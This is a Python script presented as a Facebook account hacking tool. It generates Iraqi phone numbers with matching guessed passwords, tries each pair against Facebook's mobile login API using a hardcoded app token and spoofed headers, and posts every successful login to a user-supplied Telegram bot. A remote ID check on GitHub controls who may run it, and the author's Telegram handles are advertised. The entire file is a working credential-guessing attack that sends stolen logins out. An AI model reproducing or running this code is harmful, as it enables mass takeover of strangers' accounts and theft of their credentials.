# KS977
import requests
import random
import requests
from uuid import uuid4
import time
from time import sleep
import sys
import os
os.system('clear')
uuid=str(os.getuid())+str(os.getlogin())
u="KS977"
uid=u.join(uuid)
req=requests.get('https://raw.githubusercontent.com/KS977i/idlist/main/Id.txt').text
if uid in req:
    print('\n \x1b[92mYOUR ID IS ACTIVE.........\n')
    sleep(2)
else:
   print('\n \x1b[31;1mYour ID : ' +uid+"\n")
   print (' \x1b[91mBarezm Id kat active nya\n\nTkaya bo Active krdn nama bnera bo telegram @KS_977i \n')
   os.sys.exit()
G = '\x1b[1;32m'
E = '\x1b[1;31m'
S = '\x1b[1;33m'
A = '\x1b[1;34m'
Y = '\x1b[1;35m'
B = '\x1b[1;36m'
kb="Hacked By: @KS_977i"
def lolo(s):
		for ASU in s +'\n':
			sys.stdout.write(ASU)
			sys.stdout.flush()
			sleep(100./7000)
			def error():
				print(' ')
os.system('clear')
print(E+'='*60)
logo=(""" 
#### ###    ####           ###  ##### #####
  ##  #     ##  #          ## ## #  ## #  ##
  ## #      ###            ## ##   ##    ##
 #####       ##             ####   #     #
 ## ###      ###   #####      #   ##    ##
 ##  ##   ##  ##          ## ##  ##    ##
#### ###   ####            ###   ##    ##
""")
lolo(logo)
print(' ')

lolo(E+'='*60)
print(' ')
lolo(Y+'[+]Tool Hack Account Facebook ')
lolo(G+'\n[+]Create Tool By :  @KS - 977 ')
print(' ')
lolo('[+]Chanal Telegram : https://t.me/KS_977')

lolo('\n[+]githube : https://github.com/KS977i')

lolo('\n[+]Telegram  :  KS − 977 ')
import os,sys,subprocess
import requests,sys,os,time
print(' ')
print('='*60)
print(' ')
user = '09876543210987654321'
n=('770 / 771 / 772 / 773 / 750 / 751 / 752 / 780 / 781 / 782')
print(' ')
lolo(n)
print(' ')
try:
   choice=int(input(' choice  : '))
except ValueError:
   os.system('clear')
   print(E+'\nPliz Enter Your Nmabr !!!\n')
   os.sys.exit('Try Agin !!!')
print(G+' ')
os.system('clear')
print(logo)
print(' ')
id=input('[?] ID Telegram :  ')
print('')
tok=input('[?] Token Bot : ')
print(' ')
os.system('clear')
print(E+'='*60)
print(logo)
print(E+'='*60)
print(' ')
print(G+' STARTED HACKING FB ')
print(' ')
print(G+'='*60)
while True:
     sleep(2)
     us = str(''.join((random.choice(user) for i in range(7))))
     g="+964"
     username = g+str(choice)+us
     password = str(choice)+us
     
     uid = uuid4()
     requests.urllib3.disable_warnings()
     url = "https://b-graph.facebook.com/auth/login"
     headers = {
		"authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
		"user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; BLA-L29 Build/HUAWEIBLA-L29S) [FBAN/MessengerLite;FBAV/305.0.0.7.106;FBPN/com.facebook.mlite;FBLC/ar_PS;FBBV/372376702;FBCR/Ooredoo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/BLA-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2040};]"
	}
     data = f"email={username}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uid}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
     response = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
     
     if list(response)[0] == "session_key":
        print(' ')
        YES=f"""
[✓] Hacked :
[✓] Email: {username}
[✓] Pass: {password}
━━━━━━━━━━━━━"""
        print(G+f'GOOD Haced {username}>>{password} ')
        requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={YES}\nBY @KS_977i')
        print(' ')
        print(G+kb)
                        
     else:
        print(' ')
        print(E+f'Not Hack {username}>>{password} ')
        print(' ')
    
